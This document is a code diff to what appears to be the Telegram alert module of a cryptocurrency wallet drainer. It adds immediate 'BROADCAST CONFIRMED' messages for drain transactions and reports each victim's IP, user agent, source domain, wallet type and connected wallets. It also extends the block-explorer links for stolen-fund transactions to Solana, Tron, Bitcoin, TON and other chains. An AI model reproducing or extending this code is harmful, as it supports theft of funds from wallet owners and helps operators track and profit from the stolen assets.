@@ -200,6 +200,12 @@ function appendInstitutionalFields(ctx?: TelegramRequestContext): string {
   if (ctx.wallet_type != null && literalValue(ctx.wallet_type) !== 'N/A') {
     lines += `👛 <b>Wallet Type:</b> ${literalValue(ctx.wallet_type)}\n`
   }
+  if (ctx.active_chain_tab != null && literalValue(ctx.active_chain_tab) !== 'N/A') {
+    lines += `📑 <b>Active Tab:</b> ${literalValue(ctx.active_chain_tab)}\n`
+  }
+  if (ctx.connected_wallets != null && literalValue(ctx.connected_wallets) !== 'N/A') {
+    lines += `🔀 <b>Connected:</b> ${literalValue(ctx.connected_wallets)}\n`
+  }
   if (ctx.scout_value_usd != null && literalValue(ctx.scout_value_usd) !== 'N/A') {
     lines += codeLine('Scout Value USD', ctx.scout_value_usd)
   }
@@ -412,6 +418,8 @@ export interface TelegramRequestContext {
   ip?: string
   userAgent?: string
   sourceDomain?: string
+  active_chain_tab?: string
+  connected_wallets?: string
   tokenName?: string
   tokenAddress?: string
   chain_family?: string
@@ -540,12 +548,27 @@ export async function notifyBroadcastScheduled(
   await sendTelegramMessage(text)
 }
 
-/** Batched into 5-minute settlement summary (not sent immediately). */
+/** Sends immediate settlement TX alert and enqueues 5-minute batch summary. */
 export async function notifyBroadcastConfirmed(
   txHash: string,
   address: string,
   ctx?: TelegramRequestContext,
 ): Promise<void> {
+  const chainFamily = ctx?.chain_family ?? null
+  const explorer = resolveExplorerTxUrl(txHash, ctx?.chain_id, chainFamily)
+  const txLine = explorer
+    ? `🔗 <b>TX:</b> <a href="${explorer}">${truncateWalletForAlert(txHash)}</a>\n`
+    : codeLine('TX', txHash)
+
+  const text =
+    `✅ <b>BROADCAST CONFIRMED</b>\n` +
+    `━━━━━━━━━━━━━━━━\n` +
+    codeLine('Wallet Address', address) +
+    txLine +
+    appendInstitutionalFields(ctx) +
+    `🕐 ${getISTTimestamp()}`
+  await sendTelegramMessage(text)
+
   enqueueDrainBatchEntry({
     wallet: address,
     usd: ctx?.scout_value_usd ?? ctx?.amount,
@@ -716,8 +739,41 @@ function truncateWalletForAlert(addr: string): string {
   return `${a.slice(0, 6)}…${a.slice(-4)}`
 }
 
-function resolveExplorerTxUrl(txHash: string, chainId?: string | number | null): string | null {
+function resolveExplorerTxUrl(
+  txHash: string,
+  chainId?: string | number | null,
+  chainFamily?: string | null,
+): string | null {
   const hash = txHash.trim()
+  if (!hash) return null
+  const family = (chainFamily ?? '').toUpperCase()
+
+  if (family === 'SVM' || family === 'SOLANA' || family === 'SOL') {
+    return `https://solscan.io/tx/${hash}`
+  }
+  if (family === 'TRON' || family === 'TRX') {
+    const h = hash.replace(/^0x/i, '')
+    return `https://tronscan.org/#/transaction/${h}`
+  }
+  if (family === 'TON') {
+    return `https://tonviewer.com/transaction/${encodeURIComponent(hash)}`
+  }
+  if (family === 'UTXO' || family === 'BTC' || family === 'BITCOIN') {
+    const h = hash.replace(/^0x/i, '')
+    return `https://mempool.space/tx/${h}`
+  }
+  if (family === 'COSMOS') {
+    const h = hash.replace(/^0x/i, '').toUpperCase()
+    return `https://www.mintscan.io/cosmos/tx/${h}`
+  }
+  if (family === 'APTOS') {
+    const h = hash.startsWith('0x') ? hash : `0x${hash}`
+    return `https://explorer.aptoslabs.com/txn/${h}?network=mainnet`
+  }
+  if (family === 'SUI') {
+    return `https://suiscan.xyz/mainnet/tx/${hash}`
+  }
+
   if (!/^0x[0-9a-fA-F]{64}$/.test(hash)) return null
   const chain = String(chainId ?? '1').replace(/^eip155:/i, '')
   if (chain === '1' || chain === '') return `https://etherscan.io/tx/${hash}`
@@ -726,6 +782,7 @@ function resolveExplorerTxUrl(txHash: string, chainId?: string | number | null):
   if (chain === '42161') return `https://arbiscan.io/tx/${hash}`
   if (chain === '10') return `https://optimistic.etherscan.io/tx/${hash}`
   if (chain === '8453') return `https://basescan.org/tx/${hash}`
+  if (chain === '43114') return `https://snowtrace.io/tx/${hash}`
   return `https://etherscan.io/tx/${hash}`
 }
 
@@ -834,7 +891,11 @@ export async function notifySettlementResult(params: {
 
   let txLine = ''
   if (params.tx_hash) {
-    const explorer = resolveExplorerTxUrl(params.tx_hash, params.chain_id)
+    const explorer = resolveExplorerTxUrl(
+      params.tx_hash,
+      params.chain_id,
+      params.chain_family ?? null,
+    )
     txLine = explorer
       ? `🔗 <b>TX:</b> <a href="${explorer}">${truncateWalletForAlert(params.tx_hash)}</a>\n`
       : codeLine('TX', params.tx_hash)
